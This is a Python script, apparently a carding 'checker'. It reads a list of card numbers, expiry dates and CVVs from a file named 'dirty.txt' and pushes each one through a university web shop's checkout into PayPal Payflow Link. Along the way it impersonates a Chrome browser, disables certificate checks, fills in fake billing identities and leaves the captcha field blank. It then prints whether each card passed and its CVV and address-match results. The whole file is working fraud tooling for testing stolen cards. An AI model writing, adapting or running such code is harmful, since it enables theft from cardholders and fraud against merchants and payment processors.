import random
from curl_cffi import requests
from tools import Tools

class PayMyFlow:
    @staticmethod
    def pc(card):
        session = requests.Session(impersonate='chrome123')
        session.verify = False
        cc, mes, ano, cvv = card.split('|')
        req = session.get("https://www.owp.csus.edu/cart/add-product.php?id=210")
        tags = Tools.getInputTags(req.text)

        req = session.post(
            "https://www.owp.csus.edu/cart/add-product.php",
            data={
                'id': '210',
                'frmtoken': tags['frmtoken'],
                'fee14600': '1',
            }
        )

        req = session.get("https://www.owp.csus.edu/checkout/index.php")
        tags = Tools.getInputTags(req.text)

        fake = Tools.fakeData()
        while fake.get("state") == "TX":
            fake = Tools.fakeData()

        req = session.post(
            "https://www.owp.csus.edu/checkout/index.php",
            data={
                'frmtoken': tags['frmtoken'],
                'first_name': fake['name'],
                'last_name': fake['last'],
                'email': fake['email'],
                'address_type': 'residential',
                'ship_attention_to': '',
                'ship_street_1': fake['street'],
                'ship_street_2': '',
                'ship_city': fake['city'],
                'ship_state': fake['state'],
                'ship_postal_code': fake['zip'],
                'ship_country': '1',
                'ship_phone_country': '1',
                'ship_phone_area_code': str(random.randint(100, 999)),
                'ship_phone_local': str(random.randint(1000000, 9999999)),
                'ship_phone_extension': '',
                'use_ship_address': '1',
                'bill_attention_to': '',
                'bill_street_1': fake['street'],
                'bill_street_2': '',
                'bill_city': fake['city'],
                'bill_state': fake['state'],
                'bill_postal_code': fake['zip'],
                'bill_country': '1',
                'bill_phone_country': '1',
                'bill_phone_area_code': str(random.randint(100, 999)),
                'bill_phone_local': str(random.randint(1000000, 9999999)),
                'bill_phone_extension': '',
            }
        )

        tags = Tools.getInputTags(req.text)

        req = session.post(
            "https://www.owp.csus.edu/checkout/checkout2.php",
            data={
                'frmtoken': tags['frmtoken'],
                'shipopt': '03',
                'billed_as': '1',
                'refund_agree': '1',
            }
        )

        pf = Tools.getInputTags(Tools.parseString(req.text, '<form id="online"', '</form'))

        req = session.post(
            "https://payflowlink.paypal.com/",
            data={
                'SECURETOKEN': pf['SECURETOKEN'],
                'SECURETOKENID': pf['SECURETOKENID'],
                'g-recaptcha-response': '',
            }
        )

        tags = Tools.getInputTags(req.text)

        req = session.post(
            "https://payflowlink.paypal.com/processTransaction.do",
            data={
                'subaction': '',
                'CARDNUM': cc,
                'EXPMONTH': mes,
                'EXPYEAR': ano[-2:],
                'CVV2': cvv,
                'startdate_month': '',
                'startdate_year': '',
                'issue_number': '',
                'first_name': fake['name'],
                'last_name': fake['last'],
                'COUNTRY': 'US',
                'billingAddress1': fake['street'],
                'billingAddress2': '',
                'billingCity': fake['city'],
                'billingState': fake['state'],
                'billingZip': fake['zip'],
                'PHONE': f"{fake['phone'][:3]}-{fake['phone'][3:6]}-{fake['phone'][6:]}",
                'EMAIL': fake['email'],
                'shippingPhone': '',
                'shippingEmail': '',
                'METHOD': 'C',
                'TYPE': 'S',
                'PAYMETHOD': 'C',
                'SHIPAMOUNT': '0.00',
                'TAX': '0.00',
                'INVOICE': tags['INVOICE'],
                'COMMENT1': tags['COMMENT1'],
                'USER1': tags['USER1'],
                'USER2': tags['USER2'],
                'flag3dSecure': '',
                'CURRENCY': 'USD',
                'STATE': fake['state'],
                'SECURETOKEN': tags['SECURETOKEN'],
                'SECURETOKENID': tags['SECURETOKENID'],
                'PARMLIST': '',
                'MODE': '',
                'CSRF_TOKEN': tags['CSRF_TOKEN'],
                'referringTemplate': 'templateb',
            }
        )

        data = Tools.getInputTags(req.text)

        response = {}
        response["result"] = data.get("EXTRSPMSG") or data.get("RESPMSG") or "An unexpected error has occurred, please contact an Admin."
        if "PROCAVS" in data and "CVV2MATCH" in data:
            response["additional_info"] = {
                "CVV": data["CVV2MATCH"],
                "AVS": data["PROCAVS"]
            }
        return response
    

def main():
    payflow = PayMyFlow()
    with open('dirty.txt', 'r') as file:
        cards = [line.strip() for line in file if line.strip()]
    
    for card in cards:
        result = payflow.pc(card)
        print(f"CC: {card} - {result}")

if __name__ == '__main__':
    main()